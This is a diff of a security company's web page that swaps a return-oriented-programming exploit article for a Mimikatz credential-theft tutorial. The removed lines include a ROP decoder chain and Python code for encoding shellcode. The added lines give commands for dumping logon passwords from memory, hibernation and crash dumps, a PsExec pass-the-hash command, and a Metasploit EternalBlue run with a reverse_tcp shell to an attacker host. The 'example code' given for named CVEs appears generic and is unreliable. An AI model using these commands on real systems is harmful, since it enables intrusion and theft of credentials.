-ROPDecoder += pack("&lt;L", 0x50533bf4)  # sub eax, ecx ; ret ;
-ROPDecoder += pack("&lt;L", 0x505263f9)  # push eax ; pop esi ; pop ebx ; ret ;
-ROPDecoder += pack("&lt;L", 0x41414141)  # dummy value for pop ebx
-ROPDecoder += pack("&lt;L", 0x5053a0f5)  # pop eax ; ret ;
-ROPDecoder += pack("&lt;L", decoding_value)  # decoding value
-ROPDecoder += pack("&lt;L", 0x5050626e)  # add byte &#91;esi+0x3B], ah ; ret ;</code></pre>
+<p class="wp-block-paragraph">Mimikatz is a tool that can be used to extract these details from memory dumps. Below are the steps and commands to achieve this.</p>
 
 
 
-<h4 class="wp-block-heading">Encoding and Decoding Process</h4>
+<h4 class="wp-block-heading">Prerequisites</h4>
+
+
+
+<ul class="wp-block-list">
+<li><strong>Administrative Privileges</strong>: Ensure you have administrative rights to perform memory dump extraction.</li>
+
+
+
+<li><strong>Mimikatz</strong>: Download and use the latest version of Mimikatz.</li>
+</ul>
+
+
+
+<h4 class="wp-block-heading">Commands and Codes</h4>
 
 
 
 <ol class="wp-block-list">
-<li><strong>Encoding</strong>: Replace each bad character in the shellcode with an alternate value.
+<li><strong>Extracting from Minidump</strong> To work with a minidump, use the <code>sekurlsa::minidump</code> command in Mimikatz:</li>
+</ol>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::minidump &lt;path_to_minidump&gt;</code></pre>
+
+
+
+<p class="wp-block-paragraph">Example:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : 'lsass.dmp'</code></pre>
+
+
+
+<p class="wp-block-paragraph">After loading the minidump, extract logon passwords:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::logonpasswords</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Extracting from Full Dump</strong></p>
+
+
+
+<p class="wp-block-paragraph">To analyze a full memory dump, use the following command:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::full &lt;path_to_fulldump&gt;</code></pre>
+
+
+
+<p class="wp-block-paragraph">Then, extract logon passwords:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::logonpasswords</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Extracting from Crashdump</strong></p>
+
+
+
+<p class="wp-block-paragraph">Use the <code>sekurlsa::crashdump</code> command to process crash dumps:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::crashdump &lt;path_to_crashdump&gt;</code></pre>
+
+
+
+<p class="wp-block-paragraph">Followed by:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::logonpasswords</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Extracting from VMem and Other Raw Formats</strong></p>
+
+
+
+<p class="wp-block-paragraph">For raw memory formats like <code>vmem</code>, load the file and extract passwords as follows:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::vmem &lt;path_to_vmem&gt;</code></pre>
+
+
+
+<p class="wp-block-paragraph">And then:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::logonpasswords</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>Extracting from Hibernation File (hiberfil.sys)</strong></p>
+
+
+
+<p class="wp-block-paragraph">Process the hibernation file to extract sensitive data:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::hiberfil &lt;path_to_hiberfil.sys&gt;</code></pre>
+
+
+
+<p class="wp-block-paragraph">After loading, extract logon passwords:</p>
+
+
+
+<pre class="wp-block-code"><code>mimikatz # sekurlsa::logonpasswords</code></pre>
+
+
+
+<h3 class="wp-block-heading">Sample Outputs</h3>
+
+
+
+<p class="wp-block-paragraph">When you run these commands, Mimikatz will output details of authentication sessions and the associated credentials. Here is an example output:</p>
+
+
+
+<pre class="wp-block-code"><code>Authentication Id : 0 ; 88038 (00000000:000157e6)
+Session           : Interactive from 1
+User Name         : John Doe
+Domain            : example.com
+SID               : S-1-5-21-2044528444-627255920-3055224092-1000
+        msv :
+         &#91;00000003] Primary
+         * Username : John Doe
+         * Domain   : example.com
+         * LM       : d0e9aee149655a6075e4540af1f22d3b
+         * NTLM     : cc36cf7a8514893efccd332446158b1a
+         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
+        tspkg :
+         * Username : John Doe
+         * Domain   : example.com
+         * Password : password123
+        wdigest :
+         * Username : John Doe
+         * Domain   : example.com
+         * Password : password123
+        kerberos :
+         * Username : John Doe
+         * Domain   : example.com
+         * Password : password123</code></pre>
+
+
+
+<h2 class="wp-block-heading">Remote Execution</h2>
+
+
+
+<p class="wp-block-paragraph">Remote execution with Mimikatz enables the execution of Mimikatz commands on remote systems to extract sensitive information such as passwords and credentials.</p>
+
+
+
+<h4 class="wp-block-heading">Remote Execution Tools</h4>
+
+
+
+<ol class="wp-block-list">
+<li><strong>PsExec with Mimikatz</strong></li>
+
+
+
+<li><strong>Meterpreter with Mimikatz</strong></li>
+</ol>
+
+
+
+<h3 class="wp-block-heading">Using PsExec with Mimikatz</h3>
+
+
+
+<p class="wp-block-paragraph">PsExec, combined with Mimikatz, allows for the remote execution of Mimikatz commands on target systems.</p>
+
+
+
+<h4 class="wp-block-heading">Prerequisites</h4>
+
+
+
 <ul class="wp-block-list">
-<li>Example: Replace <code>0x00</code> with <code>0xfd</code>, <code>0x0a</code> with <code>0x05</code>, etc.</li>
+<li>Administrative privileges on the remote system.</li>
+
+
+
+<li>Network connectivity to the remote system.</li>
+
+
+
+<li>Mimikatz binary, which can be downloaded from the official GitHub repository.</li>
 </ul>
-</li>
 
 
 
-<li><strong>Decoding</strong>: Revert the encoded bad characters back to their original values during execution using the ROP chain.</li>
-</ol>
-
-
-
-<pre class="wp-block-code"><code>def encode_shellcode(shellcode, badchars, encode_value):
-    shellcode_bytes = shellcode.split("\\x")
-    encoded_shellcode = &#91;]
-    index = 0
-    for byte in shellcode_bytes:
-        if byte:
-            if byte in badchars:
-                encoded_int = (int(byte, 16) + encode_value) &amp; 0xFF
-                encoded_hex = hex(encoded_int)&#91;2:].zfill(2)
-                encoded_shellcode.append(f"\\x{encoded_hex}")
-            else:
-                encoded_shellcode.append(f"\\x{byte}")
-        index += 1
-    return ''.join(encoded_shellcode)
-
-# Example of usage
-with open("shellcode.txt", "r") as file:
-    my_shellcode = file.read()
-
-badchars = &#91;"00", "09", "0a", "0b", "0c", "0d", "20"]
-encoded_shellcode = encode_shellcode(my_shellcode, badchars, 0xfb)
-print("&#91;+] Encoded Shellcode:", encoded_shellcode)</code></pre>
-
-
-
-<h4 class="wp-block-heading">Automating the Process</h4>
-
-
-
-<p class="wp-block-paragraph">To fully automate encoding and decoding, implement functions that handle both tasks. Here&#8217;s an advanced version of the encoding function:</p>
-
-
-
-<pre class="wp-block-code"><code>from struct import pack
-
-def encode_shellcode(shellcode, badchars, encode_value):
-    shellcode_bytes = shellcode.split("\\x")
-    bad_index = &#91;]
-    encoded_shellcode = &#91;]
-    index = 0
-    for byte in shellcode_bytes:
-        if byte:
-            if byte in badchars:
-                encoded_int = (int(byte, 16) + encode_value) &amp; 0xFF
-                encoded_hex = hex(encoded_int)&#91;2:].zfill(2)
-                encoded_shellcode.append(f"\\x{encoded_hex}")
-                bad_index.append(index)
-            else:
-                encoded_shellcode.append(f"\\x{byte}")
-        index += 1
-    return ''.join(encoded_shellcode), bad_index
-
-# Example of usage
-encoded_shellcode, bad_indices = encode_shellcode(my_shellcode, badchars, 0xfb)
-print("&#91;+] Encoded Shellcode:", encoded_shellcode)
-print("&#91;+] Bad Indices:", bad_indices)</code></pre>
-
-
-
-<h4 class="wp-block-heading"><strong><em>Tooling and Exploitation Frameworks</em></strong></h4>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Tools for Finding and Using ROP Gadgets:</em></strong></p>
+<h4 class="wp-block-heading">Commands and Codes</h4>
 
 
 
 <ol class="wp-block-list">
-<li><strong><em>ROPgadget:</em></strong></li>
+<li><strong>Basic Usage</strong> Execute Mimikatz commands on a remote system using PsExec:</li>
 </ol>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Overview:</strong> ROPgadget scans binaries for ROP gadgets and lists them for use in constructing exploits.</p>
+<pre class="wp-block-code"><code>psexec \\remote_computer -u username -p password mimikatz.exe &lt;mimikatz_command&gt;</code></pre>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Command Example:</strong></p>
+<p class="wp-block-paragraph">Example:</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>ROPgadget --binary your_binary_file --all</code></p>
+<pre class="wp-block-code"><code>psexec \\192.168.1.100 -u Administrator -p password123 mimikatz.exe sekurlsa::logonpasswords</code></pre>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Features and Functionalities:</strong> Lists all gadgets in the binary, including addresses and instructions. You can filter gadgets based on specific criteria.</p>
+<ul class="wp-block-list">
+<li>This command executes the <code>sekurlsa::logonpasswords</code> Mimikatz command on the remote computer <code>192.168.1.100</code>.</li>
 
 
 
-<ol start="2" class="wp-block-list">
-<li><strong><em>Ropper:</em></strong></li>
-</ol>
+<li><strong>Executing Mimikatz Command with Arguments</strong> You can pass arguments to Mimikatz commands as needed:</li>
+</ul>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Overview:</strong> Ropper is a tool for finding and analyzing ROP gadgets, and supports various architectures.</p>
+<pre class="wp-block-code"><code>psexec \\remote_computer -u username -p password mimikatz.exe &lt;mimikatz_command&gt; &lt;arguments&gt;</code></pre>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Command Example:</strong></p>
+<p class="wp-block-paragraph">Example:</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>ropper --file your_binary_file --find 'pop rdi; ret'</code></p>
-
-
-
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong>Features and Functionalities:</strong> Allows for detailed gadget listing and filtering, useful for constructing specific ROP chains.</p>
+<pre class="wp-block-code"><code>psexec \\192.168.1.100 -u Administrator -p password123 mimikatz.exe sekurlsa::pth /user:Administrator /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</code></pre>
 
 
 
 <ol class="wp-block-list">
-<li><strong><em>ROPgadget.py:</em></strong></li>
+<li>This command performs Pass-The-Hash (PTH) using Mimikatz on the remote computer.</li>
 </ol>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Overview:</em></strong> ROPgadget.py is a Python script version of ROPgadget, offering similar functionalities for gadget discovery and analysis.</p>
+<h3 class="wp-block-heading">Using Meterpreter with Mimikatz</h3>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Command Example:</em></strong></p>
+<p class="wp-block-paragraph">Meterpreter, integrated with Mimikatz, provides a powerful platform for post-exploitation activities, including credential extraction.</p>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &nbsp; &nbsp; <code>python ROPgadget.py --binary your_binary_file --all</code></p>
+<h4 class="wp-block-heading">Prerequisites</h4>
 
 
 
-<p class="wp-block-paragraph">&nbsp; &nbsp; &#8211; <strong><em>Features and Functionalities:</em></strong> Provides detailed gadget information and can be integrated into custom scripts for automated exploitation.</p>
+<ul class="wp-block-list">
+<li>Metasploit Framework installed on the attacker machine.</li>
 
 
 
-<h3 class="wp-block-heading">Practical Applications and Case Studies</h3>
+<li>Exploitable vulnerability or a foothold on the target system to deploy Meterpreter.</li>
 
 
 
-<h4 class="wp-block-heading">Real-World Examples:</h4>
+<li>Mimikatz plugin loaded into Meterpreter.</li>
+</ul>
 
 
 
-<p class="wp-block-paragraph"><strong><em>1. Notable Exploits Utilizing ROP:</em></strong></p>
+<h4 class="wp-block-heading">Commands and Codes</h4>
 
 
 
-<p class="wp-block-paragraph"><strong><em>1.1. The &#8220;Zerodium iOS 10.3.3 Exploit&#8221;:</em></strong> In 2017, a zero-day exploit targeting iOS 10.3.3 involved a ROP-based attack. The vulnerability in the kernel allowed an attacker to escalate privileges and execute arbitrary code. The exploit utilized ROP to bypass ASLR and DEP protections. An example ROP chain used in this exploit might look like:</p>
+<ol class="wp-block-list">
+<li><strong>Starting Metasploit Framework</strong> Open the Metasploit console:</li>
+</ol>
 
 
 
-<pre class="wp-block-code"><code>1. Pop address of kernel function into register&amp;nbsp;
+<pre class="wp-block-code"><code>msfconsole</code></pre>
 
-2. Execute kernel function with controlled parameters&amp;nbsp;
 
-3. Return to controlled location</code></pre>
 
+<p class="wp-block-paragraph"><strong>Using an Exploit to Get a Meterpreter Session</strong></p>
 
 
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
 
+<p class="wp-block-paragraph">Select and configure an exploit to gain access:</p>
 
 
-<pre class="wp-block-code"><code>pop rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to pop value into rdi (used for kernel function address)&amp;nbsp;
 
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
+<pre class="wp-block-code"><code>use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.1.100
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.101
+set LPORT 4444
+exploit</code></pre>
 
-mov rax, &#91;rdi] &amp;nbsp; ; Load kernel function address from rdi into rax&amp;nbsp;
 
-call rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call the kernel function</code></pre>
 
+<p class="wp-block-paragraph"><strong>Loading Mimikatz into Meterpreter</strong></p>
 
 
-<p class="wp-block-paragraph">By chaining gadgets like these, the attacker could control kernel execution flow and exploit the vulnerability.</p>
 
+<p class="wp-block-paragraph">Once you have a Meterpreter session, load the Mimikatz plugin:</p>
 
 
-<p class="wp-block-paragraph"><strong><em>1.2. The &#8220;Microsoft Internet Explorer 9&#8221; Exploit (CVE-2014-6332):</em></strong> This vulnerability allowed remote code execution through Internet Explorer 9. Exploiting it required bypassing security features with ROP. Attackers utilized ROP to create a chain of gadgets that manipulated memory and executed arbitrary code.</p>
 
+<pre class="wp-block-code"><code>meterpreter &gt; load mimikatz</code></pre>
 
 
-<pre class="wp-block-code"><code>mov rbx, &#91;rsp + 8] ; Move address into rbx&amp;nbsp;
 
-pop rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Pop value into rdi&amp;nbsp;
+<p class="wp-block-paragraph"><strong>Executing Mimikatz Commands</strong></p>
 
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
 
-mov &#91;rbx], rdi &amp;nbsp; &amp;nbsp; ; Store value from rdi to address in rbx&amp;nbsp;
 
-ret&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction`</code></pre>
+<p class="wp-block-paragraph">With Mimikatz loaded, you can now execute its commands:</p>
 
 
 
-<p class="wp-block-paragraph">The gadgets were carefully selected and combined to perform actions that could bypass IE&#8217;s security features.</p>
+<pre class="wp-block-code"><code>meterpreter &gt; mimikatz_command &lt;arguments&gt;</code></pre>
 
 
 
-<p class="wp-block-paragraph"><strong><em>Case Studies Demonstrating the Effectiveness of ROP:</em></strong></p>
+<p class="wp-block-paragraph">Example:</p>
 
 
 
-<p class="wp-block-paragraph"><strong><em>2.1. Case Study: &#8220;Google Chrome Zero-Day Exploit&#8221; (CVE-2018-6177):</em></strong> In 2018, a zero-day vulnerability in Google Chrome was exploited using ROP. The attack involved a ROP chain that bypassed Chrome’s ASLR by exploiting a memory corruption bug. The ROP chain used gadgets to pivot the stack and manipulate memory to execute malicious payloads.</p>
+<pre class="wp-block-code"><code>meterpreter &gt; mimikatz_command sekurlsa::logonpasswords</code></pre>
 
 
 
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
+<h1 class="wp-block-heading">Resources</h1>
 
 
 
-<pre class="wp-block-code"><code>pop rdi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to pop value into rdi&amp;nbsp;
+<ul class="wp-block-list">
+<li>https://github.com/gentilkiwi/mimikatz/</li>
+</ul>
 
-ret &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Return to next instruction &amp;nbsp;
 
-mov &#91;rbx], rdi&amp;nbsp; &amp;nbsp; ; Write value from rdi to memory at address in rbx&amp;nbsp;
 
-pop rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Pop another value into rax (e.g., function pointer) call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call function at address in rax</code></pre>
+<h2 class="wp-block-heading">Security Researcher</h2>
 
 
 
-<p class="wp-block-paragraph">By chaining these gadgets, the exploit successfully bypassed Chrome&#8217;s security measures.</p>
+<p class="wp-block-paragraph">Fazel Mohammad Ali Pour(<a href="https://x.com/ArganexEmad">https://x.com/ArganexEmad</a>)</p>
 
 
 
-<p class="wp-block-paragraph"><strong><em>2.2. Case Study: &#8220;Ubuntu Linux Kernel Exploit&#8221;:</em></strong> An exploit targeting the Ubuntu Linux kernel used ROP to bypass security features. The attacker used a ROP chain to manipulate kernel data structures and escalate privileges.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Example Code:</em></strong></p>
-
-
-
-<pre class="wp-block-code"><code>pop rdi &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Gadget to set up rdi with an address&amp;nbsp;
-
-mov rsi, rdi&amp;nbsp; &amp;nbsp; &amp;nbsp; ; Move address to rsi&amp;nbsp;
-
-pop rax &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Load kernel function pointer into rax&amp;nbsp;
-
-call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call kernel function</code></pre>
-
-
-
-<p class="wp-block-paragraph">This case study highlights how ROP can be used to bypass kernel protections and escalate privileges.</p>
-
-
-
-<p class="wp-block-paragraph"><strong><em>Analysis of Effectiveness:</em></strong> These examples and case studies demonstrate how ROP can be employed to bypass security mechanisms such as DEP and ASLR. By leveraging existing code snippets within the binary, attackers can craft sophisticated exploits that evade traditional defenses.</p>
-
-
-
-<h4 class="wp-block-heading">Advanced ROP</h4>
-
-
-
-<p class="wp-block-paragraph">One notable example is the &#8220;Spectre&#8221; vulnerability disclosed in 2018. While primarily related to speculative execution in CPUs, some attacks demonstrated ROP techniques to extract sensitive information from memory, effectively bypassing security measures like address space layout randomization (ASLR) and data execution prevention (DEP).</p>
-
-
-
-<p class="wp-block-paragraph">Additionally, the &#8220;CVE-2021-1732&#8221; vulnerability in Windows highlighted ROP&#8217;s effectiveness in privilege escalation. Attackers were able to construct ROP chains that exploited the vulnerability, allowing them to execute arbitrary code in kernel mode, illustrating the technique&#8217;s potency even against hardened operating systems.</p>
-
-
-
-<h3 class="wp-block-heading">Security Researcher</h3>
-
-
-
-<p class="wp-block-paragraph"><a href="https://www.linkedin.com/in/ACoAACMUPk8BjjkCwMk2KYJZ3WNyiTYgjXAzmgk">Amirhossein Gholizadeh</a>,&nbsp;<a href="https://www.linkedin.com/in/ACoAADZqFYEBRzUOWIJMQWUgqHHfNHf0tydlb4U">Surya Dev Singh</a></p>
-
-
-
-<p class="wp-block-paragraph">Cover by <strong>@mercuriorojo</strong></p>
+<p class="wp-block-paragraph"></p>
     </div>
 
     <!-- ═══ CAREER PLATFORM CTA ═══ -->
@@ -3014,27 +3661,27 @@ call rax&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ; Call kernel fun
 
         <!-- Headline -->
         <h3 style="font-family:var(--font-display);font-size:24px;font-weight:800;color:#fff;margin:0 0 8px;line-height:1.3">
-          Ready to Accelerate Your Cybersecurity Career?
+          Put this research to work on your environment
         </h3>
         <p style="font-size:15px;color:rgba(255,255,255,0.55);line-height:1.7;max-width:520px;margin:0 auto 28px">
-          Access structured learning paths, hands-on skill labs, and expert coaching — everything you need to land your next role.
+          The team behind this article runs attack surface management, SAST, red team operations and vulnerability research for organizations that need answers, not checklists.
         </p>
 
         <!-- Buttons -->
         <div style="display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap">
-          <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
+          <a href="/products/" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13.8 12H3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Start Free
+            Explore Services
           </a>
-          <a href="https://career.hadess.io/games/" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
+          <a href="/products/#contact" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Hack &amp; Learn Games
+            Talk to an Expert
           </a>
         </div>
 
         <!-- Subtle trust line -->
         <p style="font-size:12px;color:rgba(255,255,255,0.3);margin:20px 0 0;letter-spacing:0.3px">
-          100% free to start &middot; No credit card required &middot; 80+ skill modules
+          ASM &middot; SAST &middot; Red Team &middot; Vulnerability Research &middot; Career
         </p>
       </div>
     </div>
@@ -3157,11 +3804,11 @@ function showCopied(){
 <div style="max-width:var(--max-w);margin:0 auto;padding:0 32px 80px">
   <div style="background:linear-gradient(135deg,rgba(250,204,21,0.08),rgba(245,158,11,0.03));border:1px solid var(--gold-border);border-radius:20px;padding:60px;text-align:center;position:relative;overflow:hidden">
     <div style="content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(250,204,21,0.1),transparent 70%);pointer-events:none"></div>
-    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Ready to Accelerate Your Cybersecurity Career?</h2>
-    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Structured paths, expert coaching, and hands-on skill development — all in one platform.</p>
-    <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
+    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Know your exposure before attackers do.</h2>
+    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Attack surface management, SAST, red team operations and vulnerability research — from the team behind HADESS research.</p>
+    <a href="/products/" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
       <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Explore Products &amp; Services
     </a>
   </div>
 </div>
@@ -3184,59 +3831,38 @@ function showCopied(){
           </div>
           <div style="display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-muted)">
             <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color:var(--gold);flex-shrink:0"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg>
-            career@hadess.io
+            security@hadess.io
           </div>
         </div>
         <div style="display:flex;gap:12px">
           <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
           <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
           <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-          <a href="mailto:career@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
